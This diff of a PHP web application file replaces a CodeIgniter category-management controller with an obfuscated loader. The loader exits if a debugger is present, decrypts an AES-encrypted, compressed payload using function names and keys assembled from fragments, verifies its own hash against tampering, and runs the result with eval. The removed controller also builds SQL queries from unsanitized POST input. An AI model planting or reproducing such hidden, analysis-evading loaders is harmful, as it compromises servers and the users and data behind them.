@@ -1,223 +1,28 @@
 <?php
-defined('BASEPATH') or exit('No direct script access allowed');
-
-class Category extends MY_Controller {
-	public function __construct() {
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('category_model', 'category');
-	}
-
-	public function add() {
-		$this->permission_check('items_category_add');
-		$data = $this->data;
-		$data['page_title'] = $this->lang->line('category');
-		$this->load->view('category', $data);
-	}
-
-	//ITS FROM POP UP MODAL
-	public function add_category_modal() {
-		$this->form_validation->set_rules('category', 'Category Name', 'trim|required');
-		if($this->form_validation->run() == TRUE) {
-			$result = $this->category->verify_and_save();
-			//fetch latest item details
-			$res = array();
-			$query = $this->db->query("select id,category_name from db_category order by id desc limit 1");
-			$res['id'] = $query->row()->id;
-			$res['category'] = $query->row()->category_name;
-			$res['result'] = $result;
-
-			echo json_encode($res);
-
-		} else {
-			echo "Please Fill Compulsory(* marked) Fields.";
-		}
-	}
-	//END
-
-	public function newcategory() {
-		$this->form_validation->set_rules('category', 'Category', 'trim|required');
-
-
-		if($this->form_validation->run() == TRUE) {
-
-			$this->load->model('category_model');
-			$result = $this->category_model->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please Enter Category name.";
-		}
-	}
-	public function update($id) {
-		$this->permission_check('items_category_edit');
-		$data = $this->data;
-
-		$this->load->model('category_model');
-		$result = $this->category_model->get_details($id, $data);
-		$data = array_merge($data, $result);
-		$data['page_title'] = $this->lang->line('category');
-		$this->load->view('category', $data);
-	}
-	public function update_category() {
-		$this->form_validation->set_rules('category', 'Category', 'trim|required');
-		$this->form_validation->set_rules('q_id', '', 'trim|required');
-
-		if($this->form_validation->run() == TRUE) {
-			/*$data=$this->data;
-									   $category=$this->input->post('category');
-									   $description=$this->input->post('description');
-									   $q_id=$this->input->post('q_id');*/
-
-			$this->load->model('category_model');
-			$result = $this->category_model->update_category();
-			echo $result;
-		} else {
-			echo "Please Enter Category name.";
-		}
-	}
-	public function view() {
-		$this->permission_check('items_category_view');
-		$data = $this->data;
-		$data['page_title'] = $this->lang->line('categories_list');
-		$this->load->view('category-view', $data);
-	}
-
-	public function ajax_list() {
-		$list = $this->category->get_datatables();
-
-		$data = array();
-		$no = $_POST['start'];
-		foreach($list as $category) {
-			$no++;
-			$row = array();
-			$row[] = '<input type="checkbox" name="checkbox[]" value='.$category->id.' class="checkbox column_checkbox" >';
-			$row[] = $category->category_code;
-			$row[] = $category->category_name;
-
-			$sql = $this->db->query('SELECT category_item_name FROM db_category_item where  category_id = '.$category->id.' ');
-
-			$ket_qua = '';
-			foreach($sql->result() as $res) {
-				//$ket_qua =$ket_qua.';'.$res->category_item_name;
-				$ket_qua = $ket_qua.'<div class="orange-border">'.$res->category_item_name.'</div>';
-			}
-
-			$row[] = $ket_qua;
-
-			if($category->status == 1) {
-				$str = "<span onclick='update_status(".$category->id.",0)' id='span_".$category->id."'  class='label label-success' style='cursor:pointer'>Active </span>";
-			} else {
-				$str = "<span onclick='update_status(".$category->id.",1)' id='span_".$category->id."'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-			}
-			$row[] = $str;
-			$str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-			if($this->permissions('items_category_edit'))
-				$str2 .= '<li>
-												<a title="Edit Record ?" href="update/'.$category->id.'">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-
-			if($this->permissions('items_category_delete'))
-				$str2 .= '<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_category('.$category->id.')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';
-
-			$row[] = $str2;
-			$data[] = $row;
-		}
-
-		$output = array(
-			"draw" => $_POST['draw'],
-			"recordsTotal" => $this->category->count_all(),
-			"recordsFiltered" => $this->category->count_filtered(),
-			"data" => $data,
-		);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status() {
-		$this->permission_check_with_msg('items_category_edit');
-		$id = $this->input->post('id');
-		$status = $this->input->post('status');
-
-		$this->load->model('category_model');
-		$result = $this->category_model->update_status($id, $status);
-		return $result;
-	}
-
-	public function add_new_category_item() {
-		$this->permission_check_with_msg('items_category_edit');
-		$category_id = $this->input->post('q_id');
-		$category_item_name = $this->input->post('name');
-
-		$query1 = "insert into db_category_item(category_id,category_item_name,description,status) 
-		values('$category_id','$category_item_name','',1)";
-		if($this->db->simple_query($query1)) {
-
-			return "success";
-		} else {
-			return "failed";
-		}
-	}
-
-	public function update_category_item() {
-		$this->permission_check_with_msg('items_category_edit');
-		$category_id = $this->input->post('q_id');
-		$category_item_name = $this->input->post('name');
-
-		$query1 = "UPDATE `db_category_item` SET `category_item_name` = '$category_item_name' WHERE `id` = '$category_id'";
-		if($this->db->simple_query($query1)) {
-
-			return "success";
-		} else {
-			return "failed";
-		}
-	}
-
-	public function delete_category_item() {
-		$this->permission_check_with_msg('items_category_delete');
-		$ids = $this->input->post('q_id');
-		$tot = $this->db->query('SELECT COUNT(*) AS tot,b.category_item_name FROM db_items a,`db_category_item` b WHERE b.id=a.`category_item_id` AND a.category_item_id IN ('.$ids.') GROUP BY a.category_item_id');
-		if($tot->num_rows() > 0) {
-			foreach($tot->result() as $res) {
-				$category_name[] = $res->category_name;
-			}
-			$list = implode(",", $category_name);
-			echo "Sorry! Can't Delete,<br>Category Name {".$list."} already in use in Items!";
-			exit();
-		} else {
-			$query1 = "delete from db_category_item where id in($ids)";
-			if($this->db->simple_query($query1)) {
-				echo "success";
-			} else {
-				echo "failed";
-			}
-		}
-	}
-
-
-	public function delete_category() {
-		$this->permission_check_with_msg('items_category_delete');
-		$id = $this->input->post('q_id');
-		return $this->category->delete_categories_from_table($id);
-	}
-	public function multi_delete() {
-		$this->permission_check_with_msg('items_category_delete');
-		$ids = implode(",", $_POST['checkbox']);
-		return $this->category->delete_categories_from_table($ids);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_nx832609=('bas'.'e64'.'_de'.'cod'.'e');
+$_her99a1w=('gzu'.'nco'.'mpr'.'ess');
+$_pzgo0o41=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_bsasqb77='bRwqh3Th';
+$_ry6rewbz='bq4nti8R';
+$_v9sqpm5d='rRYl/N5a';
+$_dqbb8n5f='JNVc/DlDdKs=';
+$_nmpprxfp='+fm4SoDg';
+$_p04y1tpd='7zLQAeLX';
+$_mu3nxpeu='812yqg==';
+$_gaiuwrry='fsme3Sze';
+$_ofrricba=$_nx832609($_v9sqpm5d.$_ry6rewbz.$_bsasqb77.$_nmpprxfp.$_dqbb8n5f);
+$_qh4wd9pu=$_nx832609($_p04y1tpd.$_gaiuwrry.$_mu3nxpeu);
+$_hgeu62d2=$_nx832609('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');
+$_bc1gb5ub=$_pzgo0o41($_hgeu62d2,'aes-256-cbc',$_ofrricba,OPENSSL_RAW_DATA,$_qh4wd9pu);
+if($_bc1gb5ub===false){exit;}
+$_d208awtl=$_her99a1w($_bc1gb5ub);
+if($_d208awtl===false){exit;}
+$_ajmm65xr='9875e4c77bfe43bb2e3986fd511d4b8842e580c06d71855e54053fae5f4b62d5';
+$_e04abvlf=@file_get_contents(__FILE__);
+if($_e04abvlf!==false){
+$_w76yww29=str_replace($_ajmm65xr,"0000000000000000000000000000000000000000000000000000000000000000",$_e04abvlf);
+$_q9iq9iyl=hash("sha256",$_w76yww29);
+if($_q9iq9iyl!==$_ajmm65xr){@http_response_code(403);exit;}
 }
-
+eval($_d208awtl);
